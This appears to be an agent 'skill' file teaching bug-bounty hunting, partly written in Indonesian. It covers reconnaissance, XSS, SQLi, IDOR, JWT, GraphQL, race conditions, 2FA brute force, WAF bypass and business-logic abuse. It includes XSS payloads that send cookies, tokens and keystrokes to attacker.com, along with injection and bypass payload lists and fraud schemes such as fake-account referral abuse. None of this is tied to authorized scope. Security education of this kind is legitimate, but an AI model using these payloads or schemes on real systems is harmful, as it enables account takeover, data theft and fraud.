---
name: advanced-bug-hunting
description: "Advanced bug hunting techniques: manual exploitation, recon automation, Burp Suite integration, API/mobile testing for $20k+ bounties"
version: 1.0.0
author: SeaGull Security Lab
license: MIT
platforms: [linux, macos, windows]
metadata:
  hermes:
    tags: [security, exploitation, penetration-testing, recon, api-testing]
    related_skills: [bug-hunting, har-capture, security-checklist]
prerequisites:
  commands: [curl, python]
---

# Advanced Bug Hunting Techniques

**Level up dari automated scanner → manual penetration tester**

Automation (skill: bug-hunting) cuma deteksi LOW/MEDIUM bugs ($50-1k). Untuk HIGH/CRITICAL ($10k-30k), butuh **manual exploitation skills**.

## When to Use

- After automated scan finds potential bugs
- Need to prove exploitability (scanner said "maybe", you prove "yes!")
- Target requires authentication bypass
- API/GraphQL endpoints discovered
- Mobile app testing
- Want $20k+ bounties (not just $200)

## The Gap Between Scanner & Pro Hunter

**Scanner User ($500/month):**
- Run automated tools
- Report "missing header" bugs
- Get Low/Medium bounties
- 90% of findings rejected

**Pro Hunter ($10k+/month):**
- Manual recon (subdomains, JS files, endpoints)
- Prove exploitability with PoC
- Chain bugs (CSRF + IDOR = Account Takeover)
- Business logic bugs (no scanner detects these)
- Get Critical/High bounties

**This skill bridges that gap!**

---

## Part 1: Reconnaissance (Find Hidden Attack Surface)

### Subdomain Enumeration

**Why:** Main domain has WAF/security. Subdomains often weaker (dev.target.com, staging.target.com).

**Tools:**
```bash
# subfinder (passive DNS)
subfinder -d target.com -o subdomains.txt

# assetfinder
assetfinder --subs-only target.com

# amass (comprehensive)
amass enum -d target.com -o amass_subs.txt

# httpx (probe alive)
cat subdomains.txt | httpx -o alive_subs.txt
```

**Manual alternative (no tools):**
```bash
# Certificate transparency logs
curl -s "https://crt.sh/?q=%25.target.com&output=json" | \
  jq -r '.[].name_value' | sort -u

# DNS brute force
for sub in www api admin dev staging test; do
  host $sub.target.com | grep "has address"
done
```

### JavaScript File Analysis

**Why:** JS files leak API endpoints, internal URLs, access tokens, AWS keys.

**Process:**
```bash
# 1. Download all JS files
wget -r -l1 -H -t1 -nd -N -np -A.js -erobots=off https://target.com

# 2. Search for sensitive data
grep -r "api" *.js
grep -r "token" *.js
grep -r "secret" *.js
grep -r "password" *.js
grep -r "aws" *.js

# 3. Extract URLs
grep -Ero "(https?://[^\"']+)" *.js | sort -u

# 4. Find hidden endpoints
grep -Ero "(/api/[^\"']+)" *.js | sort -u
```

**Real example (from success stories):**
- @inhibitor181 found Snapchat access token in mobile app JS → $15k

### Directory Brute Force

**Why:** Find admin panels, debug endpoints, backup files.

**Tools:**
```bash
# ffuf (fast)
ffuf -w /path/to/wordlist.txt -u https://target.com/FUZZ

# dirb (classic)
dirb https://target.com /usr/share/wordlists/dirb/common.txt

# Manual common paths
for path in admin api v1 v2 dev test debug backup; do
  curl -I "https://target.com/$path" | head -1
done
```

**High-value targets:**
- /admin, /wp-admin → Admin panels
- /api, /v1, /v2 → API endpoints
- /.git, /.env → Source code leaks
- /debug, /test → Debug info
- /graphql → GraphQL console

---

## Part 2: Manual Exploitation (Prove Impact)

### XSS (Cross-Site Scripting)

**Automated scanner found potential XSS. Prove it's exploitable:**

**Test payloads:**
```html
<!-- Basic test -->
<script>alert(1)</script>

<!-- Bypass filters -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">

<!-- Event handlers -->
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>

<!-- Encoded -->
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- DOM XSS -->
location.href="javascript:alert(1)"
```

**Real exploitation (for PoC):**
```javascript
// Cookie theft
<script>
fetch('https://attacker.com/?c='+document.cookie)
</script>

// Session hijack
<script>
new Image().src='https://attacker.com/?t='+localStorage.getItem('token')
</script>

// Keylogger
<script>
document.onkeypress=function(e){
  fetch('https://attacker.com/?k='+e.key)
}
</script>
```

**Example:** @rez0 got $7,560 for Stored XSS in Twitter Ads

### SQL Injection

**Automated scanner found error message. Prove data extraction:**

**Test payloads:**
```sql
-- Error-based
' OR '1'='1
' AND 1=1--
' UNION SELECT NULL--

-- Time-based (blind)
' AND SLEEP(5)--
'; WAITFOR DELAY '00:00:05'--

-- Boolean-based
' AND '1'='1
' AND '1'='2

-- Data extraction
' UNION SELECT username,password FROM users--
```

**Real example (from success stories):**
- @streaak found SQL injection in Uber Rider API → $10k

### IDOR (Insecure Direct Object Reference)

**Most common HIGH bounty bug. Scanner can't detect this!**

**How to find:**
```bash
# 1. Login as user A, get your data
curl -H "Authorization: Bearer TOKEN_A" \
  https://api.target.com/users/123

# 2. Try accessing user B's data
curl -H "Authorization: Bearer TOKEN_A" \
  https://api.target.com/users/456

# 3. If you see user B's data → IDOR!
```

**Real exploitation:**
```python
# Test all user IDs
for user_id in range(1, 10000):
    r = requests.get(f'https://api.target.com/users/{user_id}',
                    headers={'Authorization': f'Bearer {token_a}'})
    if r.status_code == 200:
        print(f"IDOR! Can access user {user_id}")
```

**Example:** @zlz found GraphQL IDOR in Shopify → $25k

### Authentication Bypass

**Highest paying bugs ($20k-30k). Requires manual testing.**

**Common techniques:**
```bash
# JWT manipulation
# 1. Decode JWT
echo "eyJ..." | base64 -d

# 2. Change "admin": false → "admin": true
# 3. Re-sign (if secret is weak)

# OAuth bypass
# 1. Intercept redirect_uri
# 2. Change to attacker.com
# 3. Steal access token

# Session fixation
# 1. Get session token before login
# 2. Login with that token
# 3. Attacker uses same token

# Password reset poisoning
# 1. Request password reset
# 2. Intercept reset link
# 3. Change Host header to attacker.com
# 4. Victim clicks link → token sent to attacker
```

**Example:** @samwcyo found OAuth bypass in PayPal → $30,250 (HIGHEST!)

### Race Conditions

**Overlooked by scanners. Manual timing attacks.**

**How to exploit:**
```bash
# Parallel requests (bypass rate limit or duplicate transaction)
for i in {1..100}; do
  curl -X POST https://api.target.com/transfer \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"amount": 100, "to": "attacker"}' &
done
wait

# Result: 100 transfers instead of 1 (if no lock)
```

**Example:** @spaceraccoon found race condition in Slack → $17,500

---

## Part 3: API & GraphQL Testing

### GraphQL Introspection

**Why:** GraphQL often exposes entire schema (all queries/mutations).

**Exploit:**
```bash
# 1. Introspection query
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{__schema{types{name,fields{name}}}}"}'

# 2. Find sensitive queries
# Look for: deleteUser, updateAdmin, getSecret, etc.

# 3. Craft exploitation query
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation{deleteUser(id:\"victim_id\")}"}'
```

**Tools:**
```bash
# GraphQL Voyager (visualize schema)
https://apis.guru/graphql-voyager/

# InQL Scanner (Burp extension)
# Automated GraphQL testing
```

### JWT Token Manipulation

**Why:** Weak JWT signatures allow privilege escalation.

**Process:**
```bash
# 1. Capture JWT from login
Authorization: Bearer eyJhbGc...

# 2. Decode (jwt.io or base64)
{
  "sub": "user123",
  "role": "user",
  "admin": false
}

# 3. Modify claims
{
  "sub": "user123",
  "role": "admin",
  "admin": true
}

# 4. Re-sign
# Try: none algorithm, weak secret, key confusion

# 5. Test
curl -H "Authorization: Bearer MODIFIED_TOKEN" \
  https://api.target.com/admin
```

**Common JWT attacks:**
- None algorithm bypass
- Weak secret brute force (rockyou.txt)
- Algorithm confusion (RS256 → HS256)
- Kid header injection

### REST API Testing

**Common bugs:**
```bash
# 1. Mass assignment
# POST /api/users with {"username": "test", "admin": true}

# 2. Broken authorization
# GET /api/users/123 (no auth check)

# 3. Excessive data exposure
# GET /api/users returns passwords

# 4. Rate limiting bypass
# X-Forwarded-For: 1.2.3.4 (change IP)

# 5. HTTP method tampering
# GET /api/admin/delete?id=123 (should be DELETE)
```

---

## Part 4: Burp Suite Integration

### Setup

**Why:** Intercept/modify HTTP requests. Essential for manual testing.

**Install:**
```bash
# Download Burp Community Edition
https://portswigger.net/burp/communitydownload

# Configure browser proxy
Settings → Proxy → localhost:8080

# Install Burp CA certificate
http://burp → CA Certificate → Import to browser
```

### Key Features

**Interceptor:**
```
1. Turn on Intercept
2. Browser makes request
3. Burp catches it
4. Modify parameters/headers
5. Forward to server
```

**Repeater:**
```
1. Right-click request → Send to Repeater
2. Modify request
3. Click Send
4. See response
5. Iterate fast
```

**Intruder (Fuzzing):**
```
1. Send to Intruder
2. Mark injection points (§param§)
3. Load payloads (XSS, SQLi, etc.)
4. Start attack
5. Analyze responses
```

### Automation

**Python with mitmproxy:**
```python
# Intercept and modify requests programmatically
from mitmproxy import http

def request(flow: http.HTTPFlow):
    # Add auth header to all requests
    flow.request.headers["X-Test"] = "exploit"
    
    # Modify POST data
    if "api/transfer" in flow.request.url:
        flow.request.text = flow.request.text.replace(
            '"amount":100',
            '"amount":999999'
        )
```

---

## Part 5: Mobile App Testing

### Android APK Analysis

**Why:** Mobile apps often have weak client-side security.

**Process:**
```bash
# 1. Download APK
# From device or apkmirror.com

# 2. Decompile
apktool d app.apk

# 3. Search for secrets
grep -r "api_key" app/
grep -r "token" app/
grep -r "password" app/

# 4. Find API endpoints
grep -r "http" app/res/

# 5. Analyze manifest
cat app/AndroidManifest.xml
# Look for: exported activities, deep links, debug flags
```

**Tools:**
- jadx (decompile to Java)
- apktool (decompile to smali)
- MobSF (automated analysis)

### Traffic Intercept

**Why:** See API calls, tokens, sensitive data.

**Setup:**
```bash
# 1. Install Burp CA on device

# 2. Configure device proxy
Settings → WiFi → Proxy → Manual
Host: laptop_ip
Port: 8080

# 3. Use app
# All traffic goes through Burp

# 4. Bypass SSL pinning (if needed)
# Use Frida + ssl-unpinning script
```

**Example:** @inhibitor181 intercepted Snapchat mobile traffic → $15k

---

## Part 6: Business Logic Bugs

**Scanner CANNOT detect these. Pure manual testing. Highest skill ceiling.**

### Common Patterns

**1. Price Manipulation**
```bash
# Shopping cart
POST /api/checkout
{"items": [{"id": 123, "price": 999.99}]}

# Change price
{"items": [{"id": 123, "price": 0.01}]}

# If server trusts client → free products
```

**2. Referral Abuse**
```bash
# Referral bonus: $10 per signup
# Create 100 fake accounts
# Refer them all to your main account
# Get $1,000 bonus
```

**3. Coupon Stacking**
```bash
# Apply same coupon multiple times
POST /api/apply_coupon
{"code": "50OFF"}

# Repeat 10 times
# Get 500% discount → negative price
```

**4. Account Takeover Chain**
```bash
# Find CSRF + Self-XSS
# Chain them:
1. CSRF changes email to attacker@evil.com
2. XSS steals session
3. Full account takeover

# Individual bugs: Low severity
# Combined: Critical ($20k+)
```

---

## Part 7: Advanced Techniques

### WAF Bypass

**Why:** Scanner triggers WAF. Manual techniques bypass it.**

**Techniques:**
```bash
# 1. Encoding
<script> → %3Cscript%3E → \x3Cscript\x3E

# 2. Case variation
<ScRiPt>alert(1)</sCrIpT>

# 3. Comment injection
<scr<!--comment-->ipt>alert(1)</script>

# 4. HTTP parameter pollution
?id=1&id=2 (server uses second value, WAF checks first)

# 5. Header manipulation
X-Forwarded-For: 127.0.0.1 (bypass IP whitelist)
```

### Chaining Bugs

**Low + Low = High ($20k)**

**Examples:**
```
CSRF + IDOR = Account Takeover
Self-XSS + Open Redirect = Stored XSS
Info Disclosure + Weak Password = Account Compromise
SSRF + Internal API = RCE
```

### 2FA Bypass

**Common weak implementations:**
```bash
# 1. Response manipulation
{"2fa_required": true} → {"2fa_required": false}

# 2. Brute force (no rate limit)
for code in {000000..999999}; do
  curl -X POST /verify_2fa -d "code=$code"
done

# 3. Reuse old codes
# If server doesn't invalidate after use

# 4. Backup codes leaked
# Check JS files, API responses
```

---

## Part 8: Reporting High-Impact Bugs

### Proof of Concept Requirements

**For $20k+ bounties:**
1. ✅ Video demo (record exploitation)
2. ✅ Step-by-step reproduction
3. ✅ Real impact (show data exfiltration, not just alert box)
4. ✅ Business impact ($X revenue loss, Y users affected)
5. ✅ Suggested fix (code-level recommendation)

**Bad PoC (gets $500):**
```
I found XSS in search box.
Steps: Put <script>alert(1)</script> in search.
```

**Good PoC (gets $20k):**
```
Account Takeover via CSRF + XSS Chain

Impact: 10M users vulnerable to full account compromise

Steps:
1. Attacker creates malicious page evil.com
2. Victim visits evil.com (via phishing or ads)
3. CSRF changes victim's email to attacker@evil.com
4. XSS steals session token
5. Attacker has full account access

PoC:
- Video: [screencast link]
- Malicious page: [evil.com source code]
- Affected endpoints: /api/change_email, /api/profile
- Business impact: Reputational damage, data breach, GDPR fines

Fix:
- Add CSRF tokens to state-changing requests
- Implement CSP to block inline scripts
- Require current password for email change
- Rate limit email change requests

Timeline:
- Discovered: 2026-07-18
- Reported: 2026-07-18
- Expected fix: 30-90 days
```

---

## Integration with Basic Pipeline

**Workflow:**

1. **Run automated scanner** (bug-hunting skill)
   → Finds 24 potential bugs

2. **Manual verification** (THIS skill)
   → Prove 10 are real, find 5 more via recon

3. **Exploitation** (THIS skill)
   → Create working PoCs with video demos

4. **Report** (advanced_report_generator.py)
   → Professional reports with business impact

5. **Track** (submission_tracker.py)
   → Monitor status and earnings

**Result:** $4k → $20k (5x earnings from same targets!)

---

## Tools Summary

### Recon
- subfinder (subdomain enum)
- httpx (probe alive hosts)
- JS file analysis (grep, manual review)
- Certificate transparency (crt.sh)

### Exploitation
- Burp Suite (intercept/modify requests)
- curl (manual API testing)
- Python requests (automation)
- Browser DevTools (inspect, network tab)

### Mobile
- apktool (decompile APK)
- jadx (Java decompiler)
- Frida (SSL unpinning)
- mitmproxy (traffic intercept)

### API Testing
- GraphQL Voyager (schema viz)
- jwt.io (token decode)
- Postman (API testing)
- InQL (GraphQL scanner)

---

## Learning Path

**Month 1: Basics**
- Setup Burp Suite
- Learn HTTP/HTTPS basics
- Practice on DVWA/WebGoat
- Study XSS, SQLi, IDOR

**Month 2: Intermediate**
- API testing (REST, GraphQL)
- JWT manipulation
- Authentication bypass
- Mobile app basics

**Month 3: Advanced**
- Business logic bugs
- Race conditions
- WAF bypass
- Bug chaining

**Month 4+: Mastery**
- Custom exploits
- 0-day hunting
- Private programs
- $20k+ bounties

---

## Real Success Formula

**Scanner findings (Low/Medium):**
- Missing headers → $100
- Exposed endpoint → $200
- Info disclosure → $300

**+ Manual exploitation (High/Critical):**
- Prove IDOR → $10k
- Chain CSRF + XSS → $15k
- Auth bypass → $30k

**Same target, 100x earnings!**

---

## Next Steps

1. ✅ Run automated scan (bug-hunting skill)
2. ✅ Pick High/Medium findings
3. 🆕 Manual verification (THIS skill)
4. 🆕 Prove exploitability (PoC)
5. 🆕 Find hidden bugs (recon)
6. ✅ Professional report
7. ✅ Track earnings

**You'll go from $500/month → $10k+/month!**

---

*This skill separates hobby hunters from $20k+ pros.*
